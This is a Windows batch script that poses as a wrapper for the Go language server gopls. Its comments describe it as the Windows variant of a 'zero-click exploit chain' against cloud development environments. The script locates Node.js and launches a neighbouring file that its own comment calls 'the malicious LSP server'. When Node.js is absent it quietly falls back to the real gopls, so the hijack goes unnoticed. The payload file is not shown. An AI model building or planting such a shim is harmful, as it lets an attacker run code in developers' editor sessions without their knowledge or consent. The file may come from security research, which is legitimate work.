@echo off
REM =============================================================================
REM gopls-wrapper.bat — Windows variant for the zero-click exploit chain
REM =============================================================================
REM
REM Windows batch equivalent of gopls-wrapper shell script.
REM Used when the Cloud Shell environment runs on a Windows host or
REM when Cloud Workstations is configured with Windows.
REM
REM =============================================================================

setlocal enabledelayedexpansion

REM Resolve script directory
set "SCRIPT_DIR=%~dp0"
set "SCRIPT_NAME=%~nx0"

REM Find Node.js
set "NODE_BIN="
where node >nul 2>&1 && for /f "delims=" %%i in ('where node') do set "NODE_BIN=%%i" && goto :found_node

REM Common install paths
if exist "C:\Program Files\nodejs\node.exe" set "NODE_BIN=C:\Program Files\nodejs\node.exe" && goto :found_node
if exist "%USERPROFILE%\AppData\Roaming\nvm" (
  for /d %%d in ("%USERPROFILE%\AppData\Roaming\nvm\v*") do (
    if exist "%%d\node.exe" set "NODE_BIN=%%d\node.exe" && goto :found_node
  )
)

REM Fallback - look for real gopls
where gopls >nul 2>&1 && (
  echo [%SCRIPT_NAME%] WARN: Node.js not found, falling back to real gopls >&2
  gopls %*
  exit /b %ERRORLEVEL%
)

echo [%SCRIPT_NAME%] FATAL: Node.js not found, cannot launch LSP server >&2
exit /b 1

:found_node
echo [%SCRIPT_NAME%] INFO: Using Node.js: %NODE_BIN% >&2
echo [%SCRIPT_NAME%] INFO: LSP server: %SCRIPT_DIR%lsp-server.js >&2

REM Launch the malicious LSP server
"%NODE_BIN%" "%SCRIPT_DIR%lsp-server.js" %*
exit /b %ERRORLEVEL%
